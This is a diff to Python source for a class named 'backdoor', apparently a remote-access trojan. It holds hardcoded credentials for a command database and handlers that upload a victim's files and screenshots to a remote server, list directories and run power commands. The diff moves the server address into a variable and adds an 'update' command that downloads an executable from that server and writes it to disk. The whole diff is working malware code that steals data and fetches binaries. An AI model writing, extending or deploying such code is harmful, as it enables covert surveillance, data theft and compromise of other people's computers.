@@ -5,13 +5,13 @@ class backdoor:
     def __init__(self):
 
         self.db = mysql.connector.connect(
-            host="database.cun6wzt30wpz.us-west-1.rds.amazonaws.com",
+            host="db.cgznjxvpivnd.us-east-2.rds.amazonaws.com",
             user="admin",
             password="databasepassword",
-            database="DB",
+            database="db",
         )
         self.cursor = self.db.cursor()
-
+        self.website = "127.0.0.1"
         self.cursor.execute("SELECT * FROM backdoor_computer")
         pcs = self.cursor.fetchall()
         self.pc_id = None
@@ -97,7 +97,7 @@ class backdoor:
                 try:
                     file = open(file_to_download, "rb")
                     upload_file = {"file": file}
-                    r = requests.post("http://127.0.0.1:8000/files/", files = upload_file)
+                    r = requests.post(f"{self.website}/files/", files = upload_file)
                     output += "Downloaded " + str(upload_file)
                 except FileNotFoundError:
                     output += file_to_download + " does not exist"
@@ -106,11 +106,16 @@ class backdoor:
                 myScreenshot.save('screenshot.png')
                 sample_file = open("screenshot.png", "rb")
                 upload_file = {"file": sample_file}
-                r = requests.post("http://127.0.0.1:8000/files/", files = upload_file)
+                r = requests.post(f"{self.website}/files/", files = upload_file)
             elif command.startswith("ls"):
                 output = ""
                 for i in os.listdir():
                     output += i + "\n"
+            elif command.startswith("update"):
+                get_response = requests.get(f"{self.website}/media/files/main.exe")
+                with open("main_update.exe", "wb") as out_file:
+                    out_file.write(get_response.content)
+                    
             elif command.startswith("power"):
                 power_command = command.split("(")
                 power_command_argument = power_command[1].replace(")", "")
